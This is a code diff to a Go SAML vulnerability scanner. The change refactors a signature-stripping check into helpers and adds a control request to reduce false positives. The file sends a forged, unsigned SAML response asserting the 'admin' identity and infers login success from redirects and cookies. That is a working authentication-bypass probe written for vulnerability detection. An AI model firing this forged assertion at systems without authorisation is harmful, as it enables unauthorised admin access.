@@ -55,10 +55,10 @@ func checkSAMLEndpoint(target string, client *http.Client, onFound func(core.Fin
 	// Endpoints that accept SAML usually return 405 (Method Not Allowed) or 400 on GET
 	if resp.StatusCode == 405 || resp.StatusCode == 200 || resp.StatusCode == 400 {
 		fmt.Printf("[*] Potential SAML Endpoint: %s\n", target)
-		
+
 		// 2. Test Signature Stripping (Critical Bypass)
 		testSignatureStripping(target, client, onFound)
-		
+
 		// 3. Test XML Comment Injection
 		testCommentInjection(target, client, onFound)
 	}
@@ -87,63 +87,32 @@ func testSignatureStripping(target string, client *http.Client, onFound func(cor
         <saml2:Subject><saml2:NameID>admin</saml2:NameID></saml2:Subject>
         <saml2:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement>
     </saml2:Assertion>
-</saml2p:Response>`
+	</saml2p:Response>`
 
 	encoded := base64.StdEncoding.EncodeToString([]byte(samlXML))
-	
-	data := url.Values{}
-	data.Set("SAMLResponse", encoded)
 
-	// Disable redirect following to inspect Location header
-	// We need a custom client/transport or just use CheckRedirect
-	// But the shared client likely follows redirects.
-	// If it follows redirects, we check the Final URL.
-	
-	resp, err := client.PostForm(target, data)
-	if err != nil {
+	unsignedSuccess, location, cookie, finalURL, err := postSAMLResponse(target, client, encoded)
+	if err != nil || !unsignedSuccess {
 		return
 	}
-	defer resp.Body.Close()
 
-	// If server accepts an unsigned response and logs us in (Redirect or 200 with success)
-	if resp.StatusCode == 302 || resp.StatusCode == 200 {
-		location := resp.Header.Get("Location")
-		cookie := resp.Header.Get("Set-Cookie")
-		finalURL := resp.Request.URL.String() // If followed
-
-		// Heuristic: Is this a LOGIN SUCCESS?
-		isSuccess := false
-		
-		// 1. Check Location/URL for "dashboard", "home", "account"
-		// AND ensure it does NOT contain "login", "error", "fail", "logout"
-		targetLower := strings.ToLower(location + finalURL)
-		if (strings.Contains(targetLower, "dashboard") || strings.Contains(targetLower, "home") || strings.Contains(targetLower, "account")) &&
-		   !strings.Contains(targetLower, "login") && 
-		   !strings.Contains(targetLower, "signin") && 
-		   !strings.Contains(targetLower, "error") && 
-		   !strings.Contains(targetLower, "fail") {
-			isSuccess = true
-		}
-
-		// 2. Check Cookie for specific session indicators (if no redirect or redirect is internal)
-		if !isSuccess && cookie != "" {
-			// Just "session" is too generic. Look for "auth", "token", "jwt", "id"
-			// AND ensure we aren't just being redirected to login which sets a tracking cookie
-			if (strings.Contains(strings.ToLower(cookie), "auth") || strings.Contains(strings.ToLower(cookie), "token")) && !strings.Contains(targetLower, "login") {
-				isSuccess = true
-			}
-		}
-
-		if isSuccess {
-			fmt.Printf("[!] POSITIVE MATCH: SAML Signature Stripping at %s\n", target)
-			onFound(core.Finding{
-				Type:     "SAML Vulnerability",
-				Target:   target,
-				Detail:   fmt.Sprintf("Server accepted an unsigned SAML Response (Signature Stripping).\nRedirect/URL: %s\nCookie: %s", location+finalURL, cookie),
-				Severity: "Critical",
-			})
-		}
+	// Control test: malformed assertion should not behave like successful auth.
+	controlXML := `<not-a-saml-response>`
+	controlEncoded := base64.StdEncoding.EncodeToString([]byte(controlXML))
+	controlSuccess, _, _, _, controlErr := postSAMLResponse(target, client, controlEncoded)
+	if controlErr == nil && controlSuccess {
+		// Likely generic redirect behavior, not specific proof of signature bypass.
+		return
 	}
+
+	fmt.Printf("[!] POSITIVE MATCH: SAML Signature Stripping signal at %s\n", target)
+	onFound(core.Finding{
+		Type:       "SAML Vulnerability",
+		Target:     target,
+		Detail:     fmt.Sprintf("Server accepted an unsigned SAML Response (probable signature-stripping signal).\nControl-test:passed (malformed assertion was not accepted as successful auth).\nRedirect/URL: %s\nCookie: %s\nMissing controls not yet verified: audience restriction, issuer validation, replay protection.", location+finalURL, cookie),
+		Severity:   "High",
+		Confidence: "probable",
+	})
 }
 
 func testCommentInjection(target string, client *http.Client, onFound func(core.Finding)) {
@@ -167,4 +136,48 @@ func testCommentInjection(target string, client *http.Client, onFound func(core.
 
 	// Do not report informational-only SAML probing to avoid noisy false positives.
 	_ = onFound
+}
+
+func postSAMLResponse(target string, client *http.Client, encodedResponse string) (bool, string, string, string, error) {
+	data := url.Values{}
+	data.Set("SAMLResponse", encodedResponse)
+
+	resp, err := client.PostForm(target, data)
+	if err != nil {
+		return false, "", "", "", err
+	}
+	defer resp.Body.Close()
+
+	location := resp.Header.Get("Location")
+	cookie := resp.Header.Get("Set-Cookie")
+	finalURL := resp.Request.URL.String()
+	if resp.StatusCode != 302 && resp.StatusCode != 200 {
+		return false, location, cookie, finalURL, nil
+	}
+
+	return looksLikeAuthSuccess(location, finalURL, cookie), location, cookie, finalURL, nil
+}
+
+func looksLikeAuthSuccess(location, finalURL, cookie string) bool {
+	joined := strings.ToLower(location + finalURL)
+
+	hasPostAuthPath := strings.Contains(joined, "dashboard") ||
+		strings.Contains(joined, "home") ||
+		strings.Contains(joined, "account")
+	hasAuthFailurePath := strings.Contains(joined, "login") ||
+		strings.Contains(joined, "signin") ||
+		strings.Contains(joined, "error") ||
+		strings.Contains(joined, "fail")
+	if hasPostAuthPath && !hasAuthFailurePath {
+		return true
+	}
+
+	if strings.TrimSpace(cookie) == "" {
+		return false
+	}
+	cookieLower := strings.ToLower(cookie)
+	if (strings.Contains(cookieLower, "auth") || strings.Contains(cookieLower, "token")) && !hasAuthFailurePath {
+		return true
+	}
+	return false
 }
